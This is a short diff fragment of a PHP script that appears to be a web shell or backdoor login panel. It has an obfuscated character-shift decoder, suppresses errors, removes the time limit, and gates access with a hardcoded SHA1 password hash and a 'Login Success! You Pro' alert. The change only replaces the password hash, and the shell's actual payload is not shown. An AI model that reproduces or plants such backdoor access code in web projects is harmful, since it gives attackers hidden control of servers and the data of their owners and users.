@@ -11,7 +11,7 @@ $XzUJ[$i] = chr(ord($XzUJ[$i])-1);
 set_time_limit(0);
 error_reporting(0);
 session_start();
-$passwd = '2a0a1e5186c5b0e92b32eb113a94235355b06bc5';
+$passwd = 'a2ca3756e57aa590065a201b72e02a55341553bd';
 if (isset($_POST['pass'])) {
     if (SHA1($_POST['pass']) == $passwd) {
         echo "<script>alert('Login Success! You Pro');</script>";
